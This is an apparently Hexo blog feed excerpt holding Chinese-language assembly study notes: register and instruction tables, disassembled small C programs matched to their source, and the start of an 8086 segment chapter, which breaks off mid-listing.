    <updated>2021-08-13T07:42:48.753Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    <category term="博客测试" scheme="http://example.com/categories/%E5%8D%9A%E5%AE%A2%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>汇编学习笔记第一次</title>
    <link href="http://example.com/2020/04/14/%E6%B1%87%E7%BC%96%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%BB%BB%E5%8A%A1/"/>
    <id>http://example.com/2020/04/14/%E6%B1%87%E7%BC%96%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%BB%BB%E5%8A%A1/</id>
    <published>2020-04-14T11:43:34.000Z</published>
    <updated>2021-08-13T07:58:08.271Z</updated>
    
    <content type="html"><![CDATA[<h1 id="汇编学习笔记第一次"><a href="#汇编学习笔记第一次" class="headerlink" title="汇编学习笔记第一次"></a>汇编学习笔记第一次</h1><p>感谢乐哥能花费时间和精力来带带弟弟，弟弟一定努力</p><p>借着这次机会，刚好复习复习汇编的知识，将其熟练。</p><p><a href="https://imgchr.com/i/BL2lX4"><img src="https://s1.ax1x.com/2020/11/10/BL2lX4.png" alt="BL2lX4.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hint：</span><br><span class="line"></span><br><span class="line">1. 编译命令：gcc -z execstack -z norelro -no-pie -fno-stack-protector -o program program.c</span><br><span class="line">2. 反编译命令：objdump -d -m i386:x86-64:intel program</span><br><span class="line"></span><br><span class="line">gcc -z execstack -z norelro -no-pie -fno-stack-protector -o test test.c</span><br><span class="line">objdump -d -m i386:x86-64:intel test</span><br><span class="line">或者是</span><br><span class="line">gcc -g -c test.c</span><br><span class="line">objdump -d -M intel -S test.o</span><br></pre></td></tr></table></figure><h3 id="先巩固下基础知识"><a href="#先巩固下基础知识" class="headerlink" title="先巩固下基础知识"></a><strong>先巩固下基础知识</strong></h3><h2 id="16位寄存器"><a href="#16位寄存器" class="headerlink" title="16位寄存器"></a>16位寄存器</h2><table><thead><tr><th>指令</th><th>描述</th></tr></thead><tbody><tr><td>AH累加器(Accumulator)  AL</td><td>可用于乘、除、输入/输出等操作(在乘除指令中指定用来存放操作数)</td></tr><tr><td></td><td></td></tr><tr><td>BH基地址寄存器(Base Register)  BL</td><td>在计算存储器地址时，可作为基址寄存器使用。</td></tr><tr><td>BL</td><td></td></tr><tr><td>CH计数寄存器(Count Register)  CL</td><td>在循环和字符串操作时，要用它来控制循环次数；在位操作中，当移多位时，要用CL来指明移位的位数；</td></tr><tr><td>CL</td><td></td></tr><tr><td>DH数据寄存器(DataRegister)  DL</td><td>在进行乘、除运算时，它可作为默认的操作数参与运算，也可用于存放I/O的端口地址。在16位CPU中，AX、BX、CX和DX不能作为基址和变址寄存器来存放存储单元的地址，但在32位CPU中，其32位寄存器EAX、EBX、ECX和EDX不仅可传送数据、暂存数据保存算术逻辑运算结果，而且也可作为指针寄存器，所以，这些32位寄存器更具有通用性。</td></tr><tr><td>DL</td><td></td></tr></tbody></table><h2 id="32位寄存器"><a href="#32位寄存器" class="headerlink" title="32位寄存器"></a>32位寄存器</h2><table><thead><tr><th>指令</th><th>描述</th></tr></thead><tbody><tr><td>eax</td><td>EAX被称为32位累加器</td></tr><tr><td>ecx（计数寄存器）</td><td>ECX中的C即Count（计数之意）。在许多指令中，ECX、CX、CL被用作计数器。</td></tr><tr><td>edx（数据寄存器）</td><td>EDX中的D即Data（数据之意）。在进行乘法等运算时，常用EDX与EAX或DX与AX的组合来存放一个4字数或双字数。此外，DX也用来存放I/O端口地址。</td></tr><tr><td>ebx（基址寄存器）</td><td>EBX中的B即Base（基址之意）。EBX与BX常用来表示内存地址，现在所使用的PC中地址都是较大的整数，一般不会是8位，所以BL就不常使用了。</td></tr><tr><td>esp</td><td>ESP或SP用来指示堆栈段中的栈顶地址。一般情况下不使用ESP或SP做算术运算。</td></tr><tr><td>ebp</td><td>EBP和BP常用来存放内存地址，它们在默认情况下指向堆栈段中的存储单元。</td></tr><tr><td>esi</td><td>ESI或SI在串指令中表示源数据串的地址。</td></tr><tr><td>edi</td><td>EDI或DI在串指令中表示目的数据串的地址。</td></tr><tr><td>eip</td><td>指令指针EIP、IP(Instruction Pointer)是存放下次将要执行的指令在代码段的偏移量。</td></tr><tr><td>eflags（Flags Register）</td><td>。标志寄存器也称为程序状态寄存器或状态寄存器。指令指针和标志寄存器不能用作指令的操作数，它们是由CPU直接操纵的。特别地，EIP和EFLAGS的低16位分别由IP和FLAGS标识。</td></tr><tr><td>cs(Code Segment Register)代码段寄存器</td><td>其值为代码段的段值；</td></tr><tr><td>ss(Stack Segment Register)堆栈段寄存器</td><td>其值为堆栈段的段值；</td></tr><tr><td>ds(Data Segment Register)数据段寄存器</td><td>其值为数据段的段值；</td></tr><tr><td>es(Extra Segment Register)附加段寄存器</td><td>其值为附加数据段的段值；</td></tr><tr><td>fs(Extra Segment Register)附加段寄存器</td><td>其值为附加数据段的段值；</td></tr><tr><td>gs(Extra Segment Register)附加段寄存器</td><td>其值为附加数据段的段值。</td></tr></tbody></table><h2 id="64位寄存器"><a href="#64位寄存器" class="headerlink" title="64位寄存器"></a>64位寄存器</h2><table><thead><tr><th>指令</th><th>描述</th></tr></thead><tbody><tr><td>rax</td><td>与32位类似</td></tr><tr><td>rbx</td><td>与32位类似</td></tr><tr><td>rcx</td><td>与32位类似</td></tr><tr><td>rdx</td><td>与32位类似</td></tr><tr><td>rsi</td><td>与32位类似</td></tr><tr><td>rdi</td><td>与32位类似</td></tr><tr><td>rbp</td><td>与32位类似</td></tr><tr><td>rsp</td><td>与32位类似</td></tr><tr><td>r8</td><td>与32位类似</td></tr><tr><td>r9</td><td>与32位类似</td></tr><tr><td>r10</td><td>与32位类似</td></tr><tr><td>r11</td><td>与32位类似</td></tr><tr><td>r12</td><td>与32位类似</td></tr><tr><td>r13</td><td>与32位类似</td></tr><tr><td>r14</td><td>与32位类似</td></tr><tr><td>r15</td><td>与32位类似</td></tr><tr><td>rip</td><td>与32位类似</td></tr><tr><td>eflags</td><td>与32位类似</td></tr><tr><td>cs(Code Segment Register)代码段寄存器</td><td>其值为代码段的段值；</td></tr><tr><td>ss(Stack Segment Register)堆栈段寄存器</td><td>其值为堆栈段的段值；</td></tr><tr><td>ds(Data Segment Register)数据段寄存器</td><td>其值为数据段的段值；</td></tr><tr><td>es(Extra Segment Register)附加段寄存器</td><td>其值为附加数据段的段值；</td></tr><tr><td>fs(Extra Segment Register)附加段寄存器</td><td>其值为附加数据段的段值；</td></tr><tr><td>gs(Extra Segment Register)附加段寄存器</td><td>其值为附加数据段的段值。</td></tr></tbody></table><h2 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h2><table><thead><tr><th align="left">寻址方式</th><th align="left">示例</th><th>操作对象</th></tr></thead><tbody><tr><td align="left">立即寻址</td><td align="left">1000h</td><td>1000h这个数字</td></tr><tr><td align="left">直接寻址</td><td align="left">[1000h]</td><td>内存1000h地址的单元</td></tr><tr><td align="left">寄存器寻址</td><td align="left">RAX</td><td>RAX这个寄存器</td></tr><tr><td align="left">寄存器间接寻址</td><td align="left">[RAX]</td><td>以RAX中存的数作为地址的内存单元</td></tr><tr><td align="left">基址寻址</td><td align="left">[RBP+10h]</td><td>将RBX中的数作为基址,加上10h,访问这个地址的内存单元</td></tr><tr><td align="left">变址寻址</td><td align="left">[RDI+10h]</td><td>将RDI作为变址寄存器,将其中的数字加上10h,访问这个地址的内存单元</td></tr><tr><td align="left">基址加变址寻址</td><td align="left">[RBX+RSI+10h]</td><td>逻辑同上</td></tr></tbody></table><h2 id="常见基础指令"><a href="#常见基础指令" class="headerlink" title="常见基础指令"></a>常见基础指令</h2><table><thead><tr><th>指令类型</th><th>操作码</th><th>指令示例</th><th>对应作用</th></tr></thead><tbody><tr><td>数据传送指令</td><td>mov</td><td>mov rax,rbx</td><td>rax = rbx</td></tr><tr><td></td><td></td><td>mov qword ptr [rdi],rax</td><td>*(rdi) = rax</td></tr><tr><td>取地址指令</td><td>lea</td><td>lea rax,[rsi]</td><td>rax = &amp; *(rsi)</td></tr><tr><td>算术运算指令</td><td>add</td><td>add rax,rbx</td><td>rax += rbx</td></tr><tr><td></td><td></td><td>add qword ptr [rax],rax</td><td>*(rdi) += rax</td></tr><tr><td></td><td>sub</td><td>sub rax,rbx</td><td>rax -= rbx</td></tr><tr><td>逻辑运算指令</td><td>and</td><td>and rax,rbx</td><td>rax &amp;= rbx</td></tr><tr><td></td><td>xor</td><td>xor rax,rbx</td><td>rax ^= rbx</td></tr><tr><td>函数调用指令</td><td>call</td><td>call 0x401000</td><td>执行0x40100地址的函数</td></tr><tr><td>函数返回指令</td><td>ret</td><td>ret</td><td>函数返回</td></tr><tr><td>比较函数</td><td>cmp</td><td>cmp rax,rbx</td><td>根据rax与rbx比较的结果改变标志位</td></tr><tr><td>无条件跳转函数</td><td>jmp</td><td>jmp 0xa01000</td><td>跳到0x401000地址执行</td></tr><tr><td>栈操作指令</td><td>push</td><td>push rax</td><td>将rax的值压入栈中</td></tr><tr><td></td><td>pop</td><td>pop rax</td><td>从栈上弹出一个元素放入rax</td></tr></tbody></table><h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h2><table><thead><tr><th>名称</th><th>标志</th><th>含义</th></tr></thead><tbody><tr><td>AF</td><td>辅助进位标志</td><td>当运算结果在第3位进位</td></tr><tr><td>PF</td><td>奇偶效验标志</td><td>当运算结果的最低有效字节有偶数个1时置1</td></tr><tr><td>SF</td><td>符号标志</td><td>有符号整形的符号位为1时置1，代表这是一个负数</td></tr><tr><td>ZF</td><td>零标志</td><td>当运算结果为全零时置1</td></tr><tr><td>OF</td><td>溢出标志</td><td>运算结果在被操作数是有符号数且溢出时置1</td></tr><tr><td>CF</td><td>进位标志</td><td>运算结果向最高位以上进位时置1，用来判断无符号数的溢出</td></tr></tbody></table><h2 id="常见判断指令"><a href="#常见判断指令" class="headerlink" title="常见判断指令"></a>常见判断指令</h2><table><thead><tr><th>指令</th><th>cmp a,b 条件（成立就跳转）</th><th>flag条件</th></tr></thead><tbody><tr><td>jz/je</td><td>a = b</td><td>ZF = 1</td></tr><tr><td>jnz/jne</td><td>a != b</td><td>ZF = 0</td></tr><tr><td>jb/jnae/jc</td><td>a &lt; b 无符号</td><td>CF = 1</td></tr><tr><td>ja/jnbe</td><td>a &gt; b 无符号</td><td></td></tr><tr><td>jna/jbe</td><td>a &lt;= b 无符号</td><td></td></tr><tr><td>jnc/jnb/jae</td><td>a &gt;= b 无符号</td><td>CF = 0</td></tr><tr><td>jg/jnle</td><td>a &gt; b 有符号</td><td></td></tr><tr><td>jge/jnl</td><td>a &gt;= b 有符号</td><td></td></tr><tr><td>jl/jnge</td><td>a &lt; b 有符号</td><td></td></tr><tr><td>jle/jng</td><td>a &lt;= b 有符号</td><td></td></tr><tr><td>jo</td><td></td><td>OF = 1 (运算结果在被操作数的是有符号数且溢出时置1)</td></tr><tr><td>js</td><td></td><td>SF = 1 (这是个负数)</td></tr></tbody></table><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><p>人们把每个函数自己的这一片区域称为帧，由于这些帧都在栈上，所以又被称为栈帧，然而栈的内存区域并不一定是固定的，而且随着每次调用路径不同，栈帧的位置也会不同。虽然栈的内容随着进栈和出栈会一直不断变化，但是一个函数中，每个局部变量相当于该函数栈帧的偏移，都是固定的，所以可以引入一个寄存器来专门存储当前栈帧的位置，即用ebp,称为帧指针。程序在函数初始化阶段赋值ebp为栈帧中间的某个位置，这样可以用ebp引用所有的局部变量，由于上一层的父函数也要用ebp，因此要在函数开始时先保存ebp，再赋值ebp为自己的栈帧的值。</p><h2 id="1-简单赋值"><a href="#1-简单赋值" class="headerlink" title="1.简单赋值"></a>1.简单赋值</h2><p><strong>EBP</strong>：栈底寄存器，存放了指向函数栈帧栈底的地址 </p><p><strong>ESP</strong>：栈顶寄存器，存放了指向函数栈帧栈顶的地址 </p><p><strong>EIP</strong>：指令寄存器（程序计算器），存放CPU将要执行的指令</p><p><strong>RIP</strong>：是保存了当前的程序的指针，加上偏移，就可以索引到静态变量的空间。</p><p><strong>rsp</strong>:   是随时可能变化的(64位的函数调用)</p><p><strong>rbp</strong>:  来作为参数和局部变量的基址(64位的函数调用)</p><h4 id="1-qword-2-dword-4-word-8-Byte-64-bit-eg-’1’-0x31"><a href="#1-qword-2-dword-4-word-8-Byte-64-bit-eg-’1’-0x31" class="headerlink" title="1 qword = 2 dword = 4 word = 8 Byte = 64 bit eg:’1’ = 0x31"></a>1 qword = 2 dword = 4 word = 8 Byte = 64 bit eg:’1’ = 0x31</h4><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">55                   push   rbp      ;将函数（比如main）的栈底压到栈</span><br><span class="line">48 89 e5             mov    rbp,rsp  //esp和ebp都指向栈顶</span><br><span class="line">c7 45 f8 01 00 00 00 mov    DWORD PTR [rbp-0x8],0x1 ;给栈中相应的地址赋值 1</span><br><span class="line">c7 45 fc 02 00 00 00 mov    DWORD PTR [rbp-0x4],0x2 ;给栈中相应的地址赋值 2</span><br><span class="line">b8 00 00 00 00       mov    eax,0x0 ;将寄存器恢复</span><br><span class="line">5d                   pop    rbp     ;将函数返回的地址弹出并记录</span><br><span class="line">c3                   ret            ;返回弹出的地址</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">2</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题就复习复习下一汇编语言</p><p>着重分析一下</p><p>汇编书中我们是用 ebp 和 esp </p><p>而在实际应用环境中，程序是64位的，就需要用rbp和esp来代替32位的ebp和esp寄存器。</p><p>rbp指向函数入口上堆栈的顶部，x86的堆栈朝向低地址；</p><p>所以访问地址为rbp的负地址<code>[rbp-0x8]</code></p><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">55                   push   rbp             ;将函数（比如main）的栈底压到栈</span><br><span class="line">48 89 e5             mov    rbp,rsp   ;esp和ebp都指向栈顶</span><br><span class="line">48 b8 31 32 33 34 35  movabs rax,0x37363534333231  </span><br><span class="line">                                ;将一堆数据存入rax寄存器，可猜测是字符串&quot;7654321&quot;,c语言中一改</span><br><span class="line">36 37 00                        ;字符串为&quot;7654321&quot;,看前面的16进制数,应该为&quot;1234567&quot;</span><br><span class="line">48 89 45 f4         mov  QWORD PTR [rbp-0xc],rax ;将给栈中相应的地址的值改成rax寄存器中的值</span><br><span class="line">c7 45 fc 02 00 00 00  mov  DWORD PTR [rbp-0x4],0x2  ;将给栈中相应的地址的值改成2</span><br><span class="line">b8 00 00 00 00       mov    eax,0x0;将寄存器恢复为0</span><br><span class="line">5d                   pop    rbp;将函数返回的地址弹出并记录</span><br><span class="line">c3                   ret                         ;返回弹出的地址</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> b[<span class="number">8</span>] = <span class="string">&quot;1234567&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">400457:55                   push  rbp</span><br><span class="line">400458:48 89 e5             mov   rbp,rsp</span><br><span class="line">40045b:c7 45 fc 02 00 00 00 mov   DWORD PTR [rbp-0x4],0x2;将给栈中相应的地址的值改成2</span><br><span class="line">400462:83 7d fc 03          cmp   DWORD PTR [rbp-0x4],0x3;比较栈中的地址与0x3的关系</span><br><span class="line">400466:7e 09                jle   400471 &lt;main+0x1a&gt;;得知是比较类似 a&gt;3是否成立 不是则跳转</span><br><span class="line">400468:c7 45 f8 01 00 00 00 mov   DWORD PTR [rbp-0x8],0x1 </span><br><span class="line">                               ; a&gt;3成立，将给栈中相应的地址的值改成1</span><br><span class="line">40046f:eb 07                jmp   400478 &lt;main+0x21&gt;      ; 判断结束,跳出判断</span><br><span class="line">400471:c7 45 f8 00 00 00 00 mov   DWORD PTR [rbp-0x8],0x0 </span><br><span class="line">                               ; 对应上面跳转来的，a&lt;=3 将给栈中相应的地址的值改成0</span><br><span class="line">400478:b8 00 00 00 00       mov   eax,0x0   ;从上面的分析可以判断为if判断</span><br><span class="line">40047d:5d                   pop   rbp</span><br><span class="line">40047e:c3                   ret</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">2</span>,b;</span><br><span class="line"><span class="keyword">if</span>(a &gt; <span class="number">3</span>)</span><br><span class="line">b=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">b=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="附加题"><a href="#附加题" class="headerlink" title="附加题"></a>附加题</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">400457:55                   push   rbp</span><br><span class="line">400458:48 89 e5             mov    rbp,rsp</span><br><span class="line">40045b:c7 45 fc 02 00 00 00 mov    DWORD PTR [rbp-0x4],0x2 </span><br><span class="line">;将给栈中相应的地址的值改成2</span><br><span class="line">400462:8b 45 fc             mov    eax,DWORD PTR [rbp-0x4] </span><br><span class="line">;将给栈中相应的地址的值存到寄存器eax中</span><br><span class="line">400465:83 f8 02             cmp    eax,0x2 </span><br><span class="line">;比较eax和0x2</span><br><span class="line">400468:74 15                je     40047f &lt;main+0x28&gt; </span><br><span class="line">;如果相等就跳转</span><br><span class="line">40046a:83 f8 03             cmp    eax,0x3     </span><br><span class="line">;较eax和0x3</span><br><span class="line">40046d:74 19                je     400488 &lt;main+0x31&gt;      </span><br><span class="line">;如果相等就跳转</span><br><span class="line">40046f:83 f8 01             cmp    eax,0x1                 </span><br><span class="line">;较eax和0x3</span><br><span class="line">400472:74 02                je     400476 &lt;main+0x1f&gt;     </span><br><span class="line">;如果相等就跳转</span><br><span class="line">400474:eb 1a                jmp    400490 &lt;main+0x39&gt;      </span><br><span class="line">;都不是，跳出整个判断，可以看出这应该是switch</span><br><span class="line">400476:c7 45 f8 02 00 00 00 mov    DWORD PTR [rbp-0x8],0x2 </span><br><span class="line">;将给栈中相应的地址的值改成2</span><br><span class="line">40047d:eb 11                jmp    400490 &lt;main+0x39&gt;      </span><br><span class="line">;跳出整个判断</span><br><span class="line">40047f:c7 45 fc 03 00 00 00 mov    DWORD PTR [rbp-0x4],0x3 </span><br><span class="line">;将给栈中相应的地址的值改成3</span><br><span class="line">400486:eb 08                jmp    400490 &lt;main+0x39&gt;      </span><br><span class="line">;跳出整个判断</span><br><span class="line">400488:c7 45 f8 01 00 00 00 mov    DWORD PTR [rbp-0x8],0x1 </span><br><span class="line">;将给栈中相应的地址的值改成3</span><br><span class="line">40048f:90                   nop                            </span><br><span class="line">;结束判断</span><br><span class="line">400490:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line">400495:5d                   pop    rbp</span><br><span class="line">400496:c3                   ret  </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">2</span>,b;</span><br><span class="line"><span class="keyword">switch</span>(a)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">a = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">b = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="感谢Prowes5师傅"><a href="#感谢Prowes5师傅" class="headerlink" title="感谢Prowes5师傅"></a><strong>感谢Prowes5师傅</strong></h1><p><a href="https://imgchr.com/i/BL2G7R"><img src="https://s1.ax1x.com/2020/11/10/BL2G7R.png" alt="BL2G7R.png"></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;汇编学习笔记第一次&quot;&gt;&lt;a href=&quot;#汇编学习笔记第一次&quot; class=&quot;headerlink&quot; title=&quot;汇编学习笔记第一次&quot;&gt;&lt;/a&gt;汇编学习笔记第一次&lt;/h1&gt;&lt;p&gt;感谢乐哥能花费时间和精力来带带弟弟，弟弟一定努力&lt;/p&gt;
&lt;p&gt;借着这次机会，刚好复</summary>
      
    
    
    
    <category term="汇编" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
  </entry>
  
  <entry>
    <title>汇编第六章</title>
    <link href="http://example.com/2020/02/14/%E6%B1%87%E7%BC%96%E7%AC%AC%E5%85%AD%E7%AB%A0/"/>
    <id>http://example.com/2020/02/14/%E6%B1%87%E7%BC%96%E7%AC%AC%E5%85%AD%E7%AB%A0/</id>
    <published>2020-02-14T11:43:34.000Z</published>
    <updated>2021-08-13T07:34:51.894Z</updated>
    
    <content type="html"><![CDATA[<h1 id="包含多个段的程序"><a href="#包含多个段的程序" class="headerlink" title="包含多个段的程序"></a>包含多个段的程序</h1><h1 id="6-1在代码段中使用数据"><a href="#6-1在代码段中使用数据" class="headerlink" title="6.1在代码段中使用数据"></a>6.1在代码段中使用数据</h1><hr><p>assume cs.codesg<br>codesg segment<br>dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h<br>mov bx,0<br>mov ax,0<br>mov cx,8<br>s: add ax,cs:[bx]<br>add bx,2<br>loop s<br>mov ax,4c00h<br>int 21h<br>codesg ends<br>end</p><hr><p>dw的含义是定义字型数据 define word（数据之间用逗号分隔）<br>db的含义是定义单字节数据define byte<br>上述8个字型数据存放在CS代码段里<br>因为用dw定义的数据处于代码段的最开始，所以偏移地址为0，这8个数据就在代码段的偏移0、2、4、6、8、A、C、E处。<br><strong>如果需要让程序在编译后可以存系统中直接运行，我们需要在源程序中指明程序的入口</strong></p><hr><p>assume cs.codesg<br>codesg segment<br>dw 0123h,0456h,0789h,0abch,Odefh,0fedh,0cbah,0987h<br>start: mov bx,0<br>mov ax,O<br>mov cx,8<br>s: add ax,cs:[bx]<br>add bx,2<br>loop s<br>mov ax,4c00h<br>int 21h<br>codesg ends</p><p>end start </p><p><strong>end除了通知编译器程序结束外，还可以通知编译器程序的入口在什么地方。</strong></p><h1 id="6-2在代码段中使用栈"><a href="#6-2在代码段中使用栈" class="headerlink" title="6.2在代码段中使用栈"></a>6.2在代码段中使用栈</h1><hr><p>codesg segment<br>dw 0123H,0456H, 0789H, 0abcH, 0defH, 0fedH,0cbaH,0987H<br>dw 0,0,0,0,0,0,0,0    ;用dw定义8个字型数据，在程序加载后，将取得8个字的<br>;内存空间，存放这8个数据。我们在后面的程序中将这段<br>;空间当作栈来使用。<br>start: mov ax, cs<br>mov ss, ax<br>mov sp,32 ;设置栈顶ss:sp指向cs:32<br>mov bx,0<br>mov cx, 8<br>s: push cs: [bx]<br>add 